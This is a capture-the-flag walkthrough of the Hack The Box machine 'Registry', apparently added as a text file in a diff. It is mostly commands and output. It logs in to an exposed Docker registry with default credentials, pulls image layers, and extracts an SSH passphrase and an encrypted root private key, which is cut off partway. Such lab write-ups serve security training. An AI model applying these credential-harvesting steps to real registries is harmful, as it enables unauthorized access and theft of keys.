@@ -1,0 +1,1143 @@
+Registry - Hack The Box - Linux Hard - Docker
+
+Dealing with Docker Registry, 
+Ports open 80, 443 , and 22.
+
+Edit hosts file and enter docker.registry.htb
+
+Check out ssl cert on port 443 for any extra info
+
+Do a gobuster
+Commands and Output:
+==================================================================================================================================
+gobuster dir -u http://registry.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-registry
+gobuster dir -u http://docker.registry.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-docker
+==================================================================================================================================
+
+We find /install
+http://registry.htb/install/
+
+We get a bunch of gibberish, we can wget the page
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $wget http://registry.htb/install/
+--2021-05-16 18:59:39--  http://registry.htb/install/
+index.html                             [ <=>                                                           ]   1.03K  --.-KB/s    in 0s
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $ls
+index.html
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $file index.html 
+index.html: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200
+==================================================================================================================================
+
+We unzip the the file using zcat
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $gzip -d install.gz 
+
+gzip: install.gz: unexpected end of file
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $zcat install.gz 
+ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data-----BEGIN CERTIFICATE-----
+MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
+BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
+MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
+T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
+zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
+r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
+zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
+qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
+8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
+HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
+LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
+UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
+7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
+CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
+QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
+-----END CERTIFICATE-----
+readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data# Private Docker Registry
+
+- https://docs.docker.com/registry/deploying/
+- https://docs.docker.com/engine/security/certificates/
+
+gzip: install.gz: unexpected end of file
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $zcat install.gz > install
+
+gzip: install.gz: unexpected end of file
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $file install
+install: POSIX tar archive (GNU)
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $mv install install.tar
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $tar -xvf install.tar 
+ca.crt
+readme.md
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $ls
+ca.crt  install.gz  install.tar  readme.md
+==================================================================================================================================
+
+We see the contents of the files
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $cat readme.md 
+# Private Docker Registry
+
+- https://docs.docker.com/registry/deploying/
+- https://docs.docker.com/engine/security/certificates/
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $cat ca.crt 
+-----BEGIN CERTIFICATE-----
+MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
+BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
+MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
+T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
+zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
+r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
+zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
+qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
+8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
+HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
+LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
+UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
+7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
+CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
+QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
+-----END CERTIFICATE-----
+==================================================================================================================================
+
+We also find more outoput on the gobuster for docker
+Commands and Output:
+==================================================================================================================================
+===============================================================
+/v2                   (Status: 301) [Size: 39] [--> /v2/]
+/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
+==================================================================================================================================
+
+http://docker.registry.htb/v2
+It is requesting username and password: we use defualt admin:admin
+We get logged in.
+
+We get a json api.
+
+Registry is a repository for docker.
+Google docker registry API.
+https://docs.docker.com/registry/spec/api/
+
+To list repos:
+v2/_catalog
+Commands and Output:
+==================================================================================================================================
+repositories	
+0	"bolt-image"
+==================================================================================================================================
+
+If we read more, we could go to:
+http://docker.registry.htb/v2/bolt-image/tags/list
+
+We can even download it using the following http query:
+http://docker.registry.htb/v2/bolt-image/manifests/latest
+
+This effectively downloads json data pertaining to certain images that will be explored, we can cat the file and use jq to look at it.
+Commands and Output:
+==================================================================================================================================
+{
+  "schemaVersion": 1,
+  "name": "bolt-image",
+  "tag": "latest",
+  "architecture": "amd64",
+  "fsLayers": [
+    {
+      "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
+    },
+    {
+      "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
+    },
+    {
+      "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
+    },
+    {
+      "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
+    },
+    {
+      "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
+    },
+    {
+      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+    },
+    {
+      "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
+    },
+    {
+      "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
+    },
+    {
+      "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
+    },
+    {
+      "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
+    }
+  ],
+  "history": [
+    {
+      "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"container_config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"created\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"created\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"created\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"created\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":{\"Cmd\":[\"/bin/bash\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"created\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]},\"throwaway\":true}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"created\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"created\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exit 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo 'DPkg::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\"]}}"
+    },
+    {
+      "v1Compatibility": "{\"id\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:02.724843678Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \"]}}"
+    }
+  ],
+  "signatures": [
+    {
+      "header": {
+        "jwk": {
+          "crv": "P-256",
+          "kid": "5LZ6:7M6G:7VK4:E5L7:I66L:CTQ2:TZ7N:VS2K:6TCH:DHWF:YSWR:XXTX",
+          "kty": "EC",
+          "x": "fqcn9ops7ejMSEmECNON0N6mKq9PZKM1TZDgOMEipT4",
+          "y": "W4yDOarB3vdWo9ICukqnMJLc3ZORxXjD8hbm1Mv2f8w"
+        },
+        "alg": "ES256"
+      },
+      "signature": "cvLyTk1Ps_9sEqCpSUSiVtAK2m9jlX_b_qksqTRnod6mRu2splPc4Xw0KCluUo_9phQvH-9ZVgYry5uhMhdUoQ",
+      "protected": "eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wNS0xN1QwMjoxODowOFoifQ"
+    }
+  ]
+}
+
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+Pulling a Layer
+
+Layers are stored in the blob portion of the registry, keyed by digest. Pulling a layer is carried out by a standard http request. The URL is as follows:
+
+GET /v2/<name>/blobs/<digest>
+==================================================================================================================================
+
+So we can use the following quey on the web browser for the first blob
+http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
+
+Commands and Output:
+==================================================================================================================================
+└──╼ $cd http/
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $ls
+'sha256 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b'
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $file sha256\ 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b 
+sha256 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b: gzip compressed data, original size modulo 2^32 3584
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $mv sha256\ 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b sha256\ 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $gzip -d sha256\ 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz 
+┌─[user@parrot-virtual]─[~/htb/registry/http]
+└──╼ $file sha256\ 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b 
+sha256 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b: POSIX tar archive
+==================================================================================================================================
+
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry/http/tmp]
+└──╼ $tar -xvf sha256\ 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar 
+etc/
+etc/profile.d/
+etc/profile.d/01-ssh.sh
+etc/profile.d/.wh.02-ssh.sh
+┌─[user@parrot-virtual]─[~/htb/registry/http/tmp]
+└──╼ $ls
+ etc  'sha256 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar'
+┌─[user@parrot-virtual]─[~/htb/registry/http/tmp]
+└──╼ $cat etc/profile.d/01-ssh.sh
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect "Enter passphrase for /root/.ssh/id_rsa:"
+send "GkOcz221Ftb3ugog\n";
+expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
+interact
+==================================================================================================================================
+
+We see a password: "GkOcz221Ftb3ugog"
+
+We will need to download docker unto our system to download the image we found on the remote server.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/http/tmp]
+└──╼ $sudo apt install docker.io
+==================================================================================================================================
+
+Once installed we can now login to the repository with docker.
+
+Commands and Output:
+==================================================================================================================================
+docker login docker.registry.htb
+==================================================================================================================================
+
+We get an error
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $docker login docker.registry.htb
+Username: admin	
+Password: 
+Error response from daemon: Get "https://docker.registry.htb/v2/": x509: certificate relies on legacy Common Name field, use SANs or temporarily enable Common Name matching with GODEBUG=x509ignoreCN=0
+==================================================================================================================================
+
+There is probably a way to igonre the warning, let's add the ca cert from the install directory, We can it with the following:
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $mkdir -p /etc/docker/certs.d/docker.registry.htb
+mkdir: cannot create directory ‘/etc/docker/certs.d’: Permission denied
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $sudo !!
+sudo mkdir -p /etc/docker/certs.d/docker.registry.htb
+[sudo] password for user: 
+┌─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $
+┌─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $sudo cp ca.crt /etc/docker/
+certs.d/  key.json  
+┌─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $sudo cp ca.crt /etc/docker/
+certs.d/  key.json  
+┌─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $sudo cp ca.crt /etc/docker/certs.d/docker.registry.htb/
+==================================================================================================================================
+
+If you keep getting errors try the following, it will make the box less secure though
+Commands and Output:
+==================================================================================================================================
+Add to /etc/docker/daemon.json  & restart docker:
+{
+"insecure-registries" : ["docker.registry.htb"]
+}
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+sudo service docker restart
+┌─[user@parrot-virtual]─[/etc/docker]
+└──╼ $docker login docker.registry.htb
+Username: admin
+Password: 
+WARNING! Your password will be stored unencrypted in /home/user/.docker/config.json.
+Configure a credential helper to remove this warning. See
+https://docs.docker.com/engine/reference/commandline/login/#credentials-store
+
+Login Succeeded
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/etc/docker]
+└──╼ $cat /home/user/.docker/config.json
+{
+	"auths": {
+		"docker.registry.htb": {
+			"auth": "YWRtaW46YWRtaW4="
+		}
+	}
+}┌
+==================================================================================================================================
+
+Creds are stored in base64
+Commands and Output:
+==================================================================================================================================
+└──╼ $echo YWRtaW46YWRtaW4= | base64 -d
+admin:admin
+==================================================================================================================================
+
+We now collect all the blobs locally and run a shell.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/install]
+└──╼ $docker run -it docker.registry.htb/bolt-image sh
+Unable to find image 'docker.registry.htb/bolt-image:latest' locally
+latest: Pulling from bolt-image
+f476d66f5408: Pull complete 
+8882c27f669e: Pull complete 
+d9af21273955: Pull complete 
+f5029279ec12: Pull complete 
+2931a8b44e49: Pull complete 
+c71b0b975ab8: Pull complete 
+02666a14e1b5: Pull complete 
+3f12770883a6: Pull complete 
+302bfcb3f10c: Pull complete 
+Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b
+Status: Downloaded newer image for docker.registry.htb/bolt-image:latest
+# ls
+bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
+==================================================================================================================================
+
+Our system is running it locally.
+Commands and Output:
+==================================================================================================================================
+# cd /root
+# find . 
+.
+./.bashrc
+./.profile
+./.ssh
+./.ssh/config
+./.ssh/id_rsa
+./.ssh/id_rsa.pub
+./.ssh/known_hosts
+./.bash_history
+./.viminfo
+==================================================================================================================================
+
+We find and ssh keys
+Commands and Output:
+==================================================================================================================================
+root@bdaaa5fa326a:~# cat ./.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9
+
+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
